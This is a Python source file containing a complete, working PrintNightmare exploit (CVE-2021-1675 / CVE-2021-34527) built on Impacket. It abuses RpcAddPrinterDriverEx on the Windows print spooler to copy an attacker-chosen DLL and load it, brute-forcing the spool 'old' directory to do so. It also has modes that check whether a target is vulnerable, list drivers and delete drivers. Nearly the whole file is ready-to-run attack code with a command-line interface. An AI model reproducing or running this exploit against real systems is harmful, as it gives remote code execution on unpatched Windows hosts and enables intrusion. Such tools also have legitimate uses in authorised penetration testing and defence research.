#!/usr/bin/python3
#
# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
#
# Authors:
#   @ollypwn (https://github.com/ollypwn)
#
# Credit:
#   @cube0x0 (https://github.com/cube0x0)
#
# Description:
#   PrintNightmare implementation using standard Impacket
#
#   PrintNightmare consists of two CVE's, CVE-2021-1675 & CVE-2021-34527.
#
#   CVE-2021-1675
#   A non-administrator user is allowed to add a new printer driver.
#   This vulnerability was fixed by only allowing administrators to
#   add a new printer driver. A patched printer spooler will return RPC_E_ACCESS_DENIED
#   whenever a non-administrator tries to add a new printer driver.
#
#   CVE-2021-34527
#   When creating a new printer driver, the pDriverPath and pConfigFile parameters
#   are checked for UNC paths, and is only allowed to be local paths. However,
#   the pDataFile parameter is not constrained to local paths. Only pDriverPath and pConfigFile
#   will be loaded for security reaons, not pDataFile. This vulnerability was fixed by not allowing
#   UNC paths in the pDataFile parameter. A patched printer spooler will return ERROR_INVALID_PARAMETER
#   when using a UNC path in pDataFile.
#
#   This exploit also works with a local path instead of an UNC path.

import sys
import logging
import argparse
import pathlib

from impacket import system_errors, version
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.structure import Structure
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRSTRUCT, NDRUNION, NULL
from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, ULONG, WSTR
from impacket.dcerpc.v5.rprn import (
    checkNullString,
    STRING_HANDLE,
    PBYTE_ARRAY,
)


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return "RPRN SessionError: code: 0x%x - %s - %s" % (
                self.error_code,
                error_msg_short,
                error_msg_verbose,
            )
        else:
            return "RPRN SessionError: unknown error code: 0x%x" % self.error_code


################################################################################
# CONSTANTS
################################################################################
# MS-RPRN - 3.1.4.4.8
APD_COPY_ALL_FILES = 0x00000004
APD_COPY_FROM_DIRECTORY = 0x00000010
APD_INSTALL_WARNED_DRIVER = 0x00008000

# MS-RPRN - 3.1.4.4.7
DPD_DELETE_UNUSED_FILES = 0x00000001

# https://docs.microsoft.com/en-us/windows/win32/com/com-error-codes-3
RPC_E_ACCESS_DENIED = 0x8001011B
system_errors.ERROR_MESSAGES[RPC_E_ACCESS_DENIED] = (
    "RPC_E_ACCESS_DENIED",
    "Access is denied.",
)

################################################################################
# STRUCTURES
################################################################################
# MS-RPRN - 2.2.1.5.1
class DRIVER_INFO_1(NDRSTRUCT):
    structure = (("pName", STRING_HANDLE),)


class PDRIVER_INFO_1(NDRPOINTER):
    referent = (("Data", DRIVER_INFO_1),)


# MS-RPRN - 2.2.1.5.2
class DRIVER_INFO_2(NDRSTRUCT):
    structure = (
        ("cVersion", DWORD),
        ("pName", LPWSTR),
        ("pEnvironment", LPWSTR),
        ("pDriverPath", LPWSTR),
        ("pDataFile", LPWSTR),
        ("pConfigFile", LPWSTR),
    )


class PDRIVER_INFO_2(NDRPOINTER):
    referent = (("Data", DRIVER_INFO_2),)


class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ("cVersion", "<L"),
        ("NameOffset", "<L"),
        ("EnvironmentOffset", "<L"),
        ("DriverPathOffset", "<L"),
        ("DataFileOffset", "<L"),
        ("ConfigFileOffset", "<L"),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data, offset=0):
        Structure.fromString(self, data)

        name = data[self["NameOffset"] + offset :].decode("utf-16-le")
        name_len = name.find("\0")
        self["Name"] = checkNullString(name[:name_len])

        self["ConfigFile"] = data[
            self["ConfigFileOffset"] + offset : self["DataFileOffset"] + offset
        ].decode("utf-16-le")
        self["DataFile"] = data[
            self["DataFileOffset"] + offset : self["DriverPathOffset"] + offset
        ].decode("utf-16-le")
        self["DriverPath"] = data[
            self["DriverPathOffset"] + offset : self["EnvironmentOffset"] + offset
        ].decode("utf-16-le")
        self["Environment"] = data[
            self["EnvironmentOffset"] + offset : self["NameOffset"] + offset
        ].decode("utf-16-le")


class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data=None, pcReturned=None):
        Structure.__init__(self, data=data)
        self["drivers"] = list()
        remaining = data
        if data is not None:
            for _ in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self["drivers"].append(attr)
                remaining = remaining[len(attr) :]


class DRIVER_INFO_UNION(NDRUNION):
    commonHdr = (("tag", ULONG),)
    union = {
        1: ("pNotUsed", PDRIVER_INFO_1),
        2: ("Level2", PDRIVER_INFO_2),
    }


# MS-RPRN - 3.1.4.1.8.3
class DRIVER_CONTAINER(NDRSTRUCT):
    structure = (
        ("Level", DWORD),
        ("DriverInfo", DRIVER_INFO_UNION),
    )


################################################################################
# RPC CALLS
################################################################################
# MS-RPRN - 3.1.4.4.2
class RpcEnumPrinterDrivers(NDRCALL):
    opnum = 10
    structure = (
        ("pName", STRING_HANDLE),
        ("pEnvironment", LPWSTR),
        ("Level", DWORD),
        ("pDrivers", PBYTE_ARRAY),
        ("cbBuf", DWORD),
    )


class RpcEnumPrinterDriversResponse(NDRCALL):
    structure = (
        ("pDrivers", PBYTE_ARRAY),
        ("pcbNeeded", DWORD),
        ("pcReturned", DWORD),
        ("ErrorCode", ULONG),
    )


# MS-RPRN - 3.1.4.4.8
class RpcAddPrinterDriverEx(NDRCALL):
    opnum = 89
    structure = (
        ("pName", STRING_HANDLE),
        ("pDriverContainer", DRIVER_CONTAINER),
        ("dwFileCopyFlags", DWORD),
    )


class RpcAddPrinterDriverExResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


# MS-RPRN - 3.1.4.4.7
class RpcDeletePrinterDriverEx(NDRCALL):
    opnum = 84
    structure = (
        ("pName", STRING_HANDLE),
        ("pEnvironment", WSTR),
        ("pDriverName", WSTR),
        ("dwDeleteFlag", DWORD),
        ("dwVersionNum", DWORD),
    )


class RpcDeletePrinterDriverExResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    10: (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),
    84: (RpcDeletePrinterDriverEx, RpcDeletePrinterDriverExResponse),
    89: (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse),
}

################################################################################
# HELPER FUNCTIONS
################################################################################
def hRpcEnumPrinterDrivers(dce, pName, pEnvironment, Level):
    request = RpcEnumPrinterDrivers()
    request["pName"] = checkNullString(pName)
    request["pEnvironment"] = checkNullString(pEnvironment)
    request["Level"] = Level
    request["pDrivers"] = NULL
    request["cbBuf"] = 0

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if str(e).find("ERROR_INSUFFICIENT_BUFFER") < 0:
            raise
        bytesNeeded = e.get_packet()["pcbNeeded"]

    request = RpcEnumPrinterDrivers()

    request["pName"] = checkNullString(pName)
    request["pEnvironment"] = checkNullString(pEnvironment)
    request["Level"] = Level
    request["pDrivers"] = b"\0" * bytesNeeded
    request["cbBuf"] = bytesNeeded

    return dce.request(request)


def hRpcAddPrinterDriverEx(dce, pName, pDriverContainer, dwFileCopyFlags):
    request = RpcAddPrinterDriverEx()

    request["pName"] = checkNullString(pName)
    request["pDriverContainer"] = pDriverContainer
    request["dwFileCopyFlags"] = dwFileCopyFlags

    return dce.request(request)


def hRpcDeletePrinterDriverEx(
    dce, pName, pEnvironment, pDriverName, dwDeleteFlag, dwVersionNum
):
    request = RpcDeletePrinterDriverEx()

    request["pName"] = checkNullString(pName)
    request["pEnvironment"] = checkNullString(pEnvironment)
    request["pDriverName"] = checkNullString(pDriverName)
    request["dwDeleteFlag"] = dwDeleteFlag
    request["dwVersionNum"] = dwVersionNum

    return dce.request(request)


################################################################################
# PrintNightmare
################################################################################
class PrintNightmare:
    def __init__(
        self,
        username="",
        password="",
        domain="",
        hashes=None,
        port=135,
        remote_name="",
        target_ip="",
        do_kerberos=False,
        dc_host="",
    ):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ""
        self.nthash = ""
        self.port = port
        self.remote_name = remote_name
        self.target_ip = target_ip
        self.do_kerberos = do_kerberos
        self.dc_host = dc_host

        if hashes is not None:
            hashes = hashes.split(":")
            if len(hashes) == 1:
                (nthash,) = hashes
                self.lmhash = self.nthash = nthash
            else:
                self.lmhash, self.nthash = hashes

    def connect(self):
        # Connect and bind to MS-RPRN (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515)
        stringbinding = r"ncacn_np:%s[\PIPE\spoolss]" % self.remote_name

        logging.debug("Binding to %s" % (repr(stringbinding)))

        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        rpctransport.set_credentials(
            self.username,
            self.password,
            self.domain,
            self.lmhash,
            self.nthash,
        )

        rpctransport.set_kerberos(self.do_kerberos, kdcHost=self.dc_host)

        rpctransport.setRemoteHost(self.target_ip)
        rpctransport.set_dport(self.port)

        try:
            dce = rpctransport.get_dce_rpc()

            # Connect to spoolss named pipe
            dce.connect()

            # Bind to MSRPC MS-RPRN UUID: 12345678-1234-ABCD-EF00-0123456789AB
            dce.bind(rprn.MSRPC_UUID_RPRN)
        except Exception as e:
            logging.error("Failed to bind: %s" % e)
            sys.exit(1)

        logging.debug("Bind OK")

        return dce

    def getDriverPath(self, dce, environment):
        # List current drivers to find the 'FileDirectory' directory
        # This directory has some unique parts of the full path
        # 'UNIDRV.DLL' is a default printer driver DLL
        drivers = self.list(environment, dce)

        for driver in drivers:
            if "filerepository" in driver["DriverPath"].lower():
                return (
                    str(pathlib.PureWindowsPath(driver["DriverPath"]).parent)
                    + r"\UNIDRV.DLL"
                )

        logging.error("Failed to find printer drivers. See -list")
        sys.exit(1)

    def list(self, environment, dce=None):
        # Use RpcEnumPrinterDrivers to get existing printer drivers
        logging.info("Enumerating printer drivers")

        if dce == None:
            dce = self.connect()

        resp = hRpcEnumPrinterDrivers(dce, NULL, environment, 2)
        blobs = DRIVER_INFO_2_ARRAY(b"".join(resp["pDrivers"]), resp["pcReturned"])
        drivers = blobs["drivers"]

        return drivers

    def delete(self, environment, name):
        # Use RpcDeletePrinterDriverEx to delete printer driver
        # and associated ununsed files. This will only delete the remote
        # DLL. May require administrative privileges
        dce = self.connect()

        try:
            hRpcDeletePrinterDriverEx(
                dce, NULL, environment, name, DPD_DELETE_UNUSED_FILES, 0
            )
        except DCERPCSessionError as e:
            logging.error("Failed to delete printer driver: %s" % e)
            sys.exit(1)
        except DCERPCException as e:
            if e.error_code == system_errors.ERROR_ACCESS_DENIED:
                logging.error(
                    "Got access denied while trying to delete printer driver: %s" % e
                )
                sys.exit(1)
            logging.error("Failed to delete printer driver: %s" % e)
            sys.exit(1)

        logging.info("Deleted printer driver!")

    def check(self):
        # Check if target is vulnerable to CVE-2021-1675 by
        # creating an empty printer driver that will fail.
        # Depending on the error code, it's possible to determine
        # it has been patched.
        dce = self.connect()

        flags = APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER

        driver_container = DRIVER_CONTAINER()
        driver_container["Level"] = 2
        driver_container["DriverInfo"]["tag"] = 2
        driver_container["DriverInfo"]["Level2"]["cVersion"] = 0
        driver_container["DriverInfo"]["Level2"]["pName"] = NULL
        driver_container["DriverInfo"]["Level2"]["pEnvironment"] = NULL
        driver_container["DriverInfo"]["Level2"]["pDriverPath"] = NULL
        driver_container["DriverInfo"]["Level2"]["pDataFile"] = NULL
        driver_container["DriverInfo"]["Level2"]["pConfigFile"] = NULL
        driver_container["DriverInfo"]["Level2"]["pConfigFile"] = NULL

        try:
            hRpcAddPrinterDriverEx(
                dce,
                pName=NULL,
                pDriverContainer=driver_container,
                dwFileCopyFlags=flags,
            )
        except DCERPCSessionError as e:
            # RPC_E_ACCESS_DENIED is returned on patched systems, when
            # a non-administrative user tries to create a new printer
            # driver
            if e.error_code == RPC_E_ACCESS_DENIED:
                return False
            # If vulnerable, 'ERROR_INVALID_PARAMETER' will be returned
            if e.error_code == system_errors.ERROR_INVALID_PARAMETER:
                return True
            raise e

        return True

    def exploit(
        self, driver_name="", environment="", driver_path="", dll_path="", iterator=10
    ):
        # Use CVE-2021-34527 and CVE-2021-1675 to copy over and laod remote DLL
        dce = self.connect()

        if driver_path == "":
            driver_path = self.getDriverPath(dce, environment)

        logging.info("Driver name: %s" % repr(driver_name))
        logging.info("Driver path: %s" % repr(driver_path))
        logging.info("DLL path: %s" % repr(dll_path))
        is_unc = False
        if dll_path.startswith("\\\\"):
            is_unc = True

        # Create a new DRIVER_CONTAINER for RpcAddPrinterDriverEx
        # 'DriverPath' must be a valid printer driver. 'UNIDRV.dll' is used by default.
        # 'ConfigFile' must be valid local DLL. It will get loaded.
        # 'DataFile' is the remote or local DLL that will loaded. It will not get loaded, only copied.
        driver_container = DRIVER_CONTAINER()
        driver_container["Level"] = 2
        driver_container["DriverInfo"]["tag"] = 2
        driver_container["DriverInfo"]["Level2"]["cVersion"] = 3
        driver_container["DriverInfo"]["Level2"]["pName"] = checkNullString(driver_name)
        driver_container["DriverInfo"]["Level2"]["pEnvironment"] = checkNullString(
            environment
        )
        driver_container["DriverInfo"]["Level2"]["pDriverPath"] = checkNullString(
            driver_path
        )
        driver_container["DriverInfo"]["Level2"]["pDataFile"] = checkNullString(
            dll_path
        )
        driver_container["DriverInfo"]["Level2"]["pConfigFile"] = checkNullString(
            "C:\\Windows\\System32\\kernelbase.dll"
        )

        # https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex
        # APD_COPY_ALL_FILES - Add the printer driver and copy all the files in the printer-driver directory.
        # APD_COPY_FROM_DIRECTORY - Add the printer driver using the fully qualified file names
        # APD_INSTALL_WARNED_DRIVER - Even if the driver is unreliable, it is installed and no warning is given
        flags = APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER

        if is_unc:
            logging.info("Copying over DLL")
        else:
            driver_container["DriverInfo"]["Level2"]["pConfigFile"] = checkNullString(
                dll_path
            )
            logging.info("Loading DLL")

        # Add new printer driver. This will copy the remote DLL to a C:\Windows\system32\spool\drivers\x64\3
        try:
            hRpcAddPrinterDriverEx(
                dce,
                pName=NULL,
                pDriverContainer=driver_container,
                dwFileCopyFlags=flags,
            )
        except DCERPCSessionError as e:
            if e.error_code == system_errors.ERROR_BAD_NET_RESP:
                logging.error(
                    "Got bad response while adding printer driver. This can happen when using smbserver.py from Impacket. Try using Samba instead (%s)"
                    % e
                )
                sys.exit(1)
            if e.error_code == RPC_E_ACCESS_DENIED:
                logging.error(
                    "Failed to create printer driver. Target is most likely patched"
                )
                sys.exit(1)

            logging.error("Failed to create printer driver: %s" % e)
            sys.exit(1)

        if is_unc:
            logging.info("Successfully copied over DLL")
        else:
            logging.info("Successfully loaded DLL")
            sys.exit(1)

        logging.info("Trying to load DLL")

        filename = pathlib.PureWindowsPath(dll_path).name

        # Whenever the printer driver is overwritten, the previous DLL's will be saved
        # to C:\Windows\system32\spool\drivers\x64\3\old\<I>\, where <I> is incremented
        # for each DLL. To find the remote DLL requires a subtle bruteforcing. Usually,
        # it will work in second iteration if run for the first time. If the exploit
        # is run again and the same filename is used, the first DLL will get loaded, since
        # it's not immediately removed from the 'old' directory.
        driver_container["DriverInfo"]["Level2"]["pConfigFile"] = checkNullString(
            "C:\\Windows\\System32\\ntdll.dll"
        )
        try:
            resp = hRpcAddPrinterDriverEx(
                dce,
                pName=NULL,
                pDriverContainer=driver_container,
                dwFileCopyFlags=flags,
            )
        except DCERPCSessionError as e:
            print("Got unexpected error: %s" % e)

        i = 1
        while True:
            driver_container["DriverInfo"]["Level2"]["pConfigFile"] = checkNullString(
                "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\%i\\%s"
                % (i, filename)
            )
            try:
                resp = hRpcAddPrinterDriverEx(
                    dce,
                    pName=NULL,
                    pDriverContainer=driver_container,
                    dwFileCopyFlags=flags,
                )
                if resp["ErrorCode"] == 0:
                    logging.info(
                        "Successfully loaded DLL from: %s"
                        % (
                            "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\%i\\%s"
                            % (i, filename)
                        )
                    )
                    sys.exit(1)
            except DCERPCSessionError as e:
                if e.error_code == system_errors.ERROR_PATH_NOT_FOUND:
                    logging.warning("Loading DLL failed. Try again.")
                    sys.exit(1)
                if e.error_code != system_errors.ERROR_FILE_NOT_FOUND:
                    logging.warning(
                        "Got unexpected error while trying to load DLL: %s" % e
                    )
            i += 1


if __name__ == "__main__":
    print(version.BANNER)

    logger.init()

    parser = argparse.ArgumentParser(
        add_help=True,
        description="PrintNightmare (CVE-2021-1675 / CVE-2021-34527)",
    )
    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<targetName or address>",
    )

    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    group = parser.add_argument_group("connection")

    group.add_argument(
        "-port",
        choices=["139", "445"],
        nargs="?",
        default="445",
        metavar="destination port",
        help="Destination port to connect to MS-RPRN named pipe",
    )
    group.add_argument(
        "-target-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the target machine. If "
        "ommited it will use whatever was specified as target. This is useful when target is the NetBIOS "
        "name and you cannot resolve it",
    )

    group = parser.add_argument_group("authentication")

    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    parser.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    parser.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    parser.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter",
    )

    group = parser.add_argument_group("driver")
    group.add_argument(
        "-name",
        action="store",
        metavar="driver name",
        default="Microsoft XPS Document Writer v5",
        help="Name for driver",
    )
    group.add_argument(
        "-env",
        action="store",
        metavar="driver name",
        default="Windows x64",
        help="Environment for driver",
    )
    group.add_argument(
        "-path", action="store", metavar="driver path", help="Driver path for driver"
    )
    group.add_argument("-dll", action="store", metavar="driver dll", help="Path to DLL")

    group = parser.add_argument_group("modes")
    group.add_argument(
        "-check", action="store_true", help="Check if target is vulnerable"
    )
    group.add_argument(
        "-list",
        action="store_true",
        help="List existing printer drivers",
    )
    group.add_argument("-delete", action="store_true", help="Deletes printer driver")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remote_name = parse_target(options.target)

    if domain is None:
        domain = ""

    if (
        password == ""
        and username != ""
        and options.hashes is None
        and options.no_pass is not True
    ):
        from getpass import getpass

        password = getpass("Password:")

    if options.target_ip is None:
        options.target_ip = remote_name

    if options.path is None:
        options.path = ""

    print_nightmare = PrintNightmare(
        username=username,
        password=password,
        domain=domain,
        hashes=options.hashes,
        do_kerberos=options.k,
        dc_host=options.dc_ip,
        port=int(options.port),
        remote_name=remote_name,
        target_ip=options.target_ip,
    )

    if options.check is not False:
        if print_nightmare.check():
            logging.info("Target appears to be vulnerable!")
        else:
            logging.warning("Target does not appear to be vulnerable")
        sys.exit(1)

    if options.list is not False:
        for driver in print_nightmare.list(options.env):
            print("Name:               %s" % driver["Name"])
            print("Environment:        %s" % driver["Environment"])
            print("Driver path:        %s" % driver["DriverPath"])
            print("Data file:          %s" % driver["DataFile"])
            print("Config file:        %s" % driver["ConfigFile"])
            print("Version:            %s" % driver["cVersion"])
            print("-" * 64)
        sys.exit(1)

    if options.delete is not False:
        print_nightmare.delete(options.env, options.name)
        sys.exit(1)

    if options.dll is None:
        logging.error("A path to a DLL is required when running the exploit")
        sys.exit(1)

    print_nightmare.exploit(options.name, options.env, options.path, options.dll)
